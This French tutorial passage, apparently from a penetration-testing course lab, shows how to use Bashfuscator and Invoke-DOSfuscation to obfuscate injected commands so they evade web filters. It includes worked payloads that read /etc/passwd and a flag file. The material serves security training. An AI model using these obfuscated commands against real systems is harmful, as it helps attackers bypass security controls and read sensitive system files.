Outils d'évasion
=============

* * * * *

Si nous avons affaire à des outils de sécurité avancés, nous ne pourrons peut-être pas utiliser les techniques d'obfuscation manuelles de base. Dans de tels cas, il peut être préférable de recourir à des outils d'obfuscation automatisés. Cette section présente quelques exemples de ces types d'outils, un pour `Linux` et un autre pour `Windows`.

* * * * *

Linux (Bashfuscator)
--------------------

Un outil pratique que nous pouvons utiliser pour masquer les commandes bash est [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). Nous pouvons cloner le référentiel à partir de GitHub, puis installer ses exigences, comme suit :

```
dsgsec@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
dsgsec@htb[/htb]$ cd Bashfuscator
dsgsec@htb[/htb]$ python3 setup.py install --user

```

Une fois l'outil configuré, nous pouvons commencer à l'utiliser à partir du répertoire `./bashfuscator/bin/` . Il existe de nombreux indicateurs que nous pouvons utiliser avec l'outil pour affiner notre commande obfusquée finale, comme nous pouvons le voir dans le menu d'aide `-h`  :

```
dsgsec@htb[/htb]$ cd ./bashfuscator/bin/
dsgsec@htb[/htb]$ ./bashfuscator -h

utilisation : bashfuscator [-h] [-l] ...SNIP...

arguments facultatifs :
   -h, --help affiche ce message d'aide et quitte

Choix du programme :
   -l, --list Liste tous les obfuscateurs, compresseurs et encodeurs disponibles
   -c COMMANDE, --commande COMMANDE
                         Commande d'obscurcir
...COUPER...

```

Nous pouvons commencer par fournir simplement la commande que nous voulons masquer avec l'indicateur `-c`  :

```
dsgsec@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutateurs utilisés : Token/ForCode -> Command/Reverse
[+] Charge utile :
  ${*/+27\[X\(} ...SNIP... ${*~}
[+] Taille de la charge utile : 1664 caractères

```

Cependant, exécuter l'outil de cette manière choisira au hasard une technique d'obscurcissement, qui peut produire une longueur de commande allant de quelques centaines de caractères à plus d'un million de caractères ! Ainsi, nous pouvons utiliser certains des drapeaux du menu d'aide pour produire une commande obscurcie plus courte et plus simple, comme suit :

```
dsgsec@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutateurs utilisés : Token/ForCode
[+] Charge utile :
eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";} ;)"
[+] Taille de la charge utile : 104 caractères

```

Nous pouvons maintenant tester la commande générée avec `bash -c ''`, pour voir si elle exécute la commande souhaitée :

```
dsgsec@htb[/htb]$ bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

racine:x:0:0:racine:/racine:/bin/bash
...COUPER...

```

Nous pouvons voir que la commande obscurcie fonctionne, tout en semblant complètement obscurcie, et ne ressemble pas à notre commande d'origine. Nous pouvons également remarquer que l'outil utilise de nombreuses techniques d'obscurcissement, y compris celles dont nous avons parlé précédemment et bien d'autres.

Exercice : essayez de tester la commande ci-dessus avec notre application Web, pour voir si elle peut contourner les filtres avec succès. Si ce n'est pas le cas, pouvez-vous deviner pourquoi? Et pouvez-vous faire en sorte que l'outil produise une charge utile de travail ?

* * * * *

Windows (DOSfuscation)
----------------------

Il existe également un outil très similaire que nous pouvons utiliser pour Windows appelé [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Contrairement à `Bashfuscator`, il s'agit d'un outil interactif, car nous l'exécutons une fois et interagissons avec lui pour obtenir la commande masquée souhaitée. Nous pouvons à nouveau cloner l'outil depuis GitHub, puis l'invoquer via PowerShell, comme suit :

```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> aide

MENU AIDE :: Options disponibles indiquées ci-dessous :
[*] Tutoriel d'utilisation de cet outil TUTORIEL
...COUPER...

Choisissez l'une des options ci-dessous :
[*] BINARY Syntaxe binaire obfusquée pour cmd.exe et powershell.exe
[*] ENCODAGE Encodage des variables d'environnement
[*] PAYLOAD Charge utile masquée via DOSfuscation

```

Nous pouvons même utiliser le `tutoriel` pour voir un exemple du fonctionnement de l'outil. Une fois que nous sommes définis, nous pouvons commencer à utiliser l'outil, comme suit :

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encodage
Invoke-DOSfuscation\Encoding> 1

...COUPER...
Résultat:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent% TMP :~-19,-18%%ALLUSERSPROFILE :~-4,-3%esktop\flag.%TMP :~-13,-12%xt

```

Enfin, nous pouvons essayer d'exécuter la commande obscurcie sur `CMD`, et nous voyons qu'elle fonctionne bien comme prévu :

```
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4, -3%ent%TMP :~-19,-18%%ALLUSERSPROFILE :~-4,-3%esktop\flag.%TMP :~-13,-12%xt

test_flag

```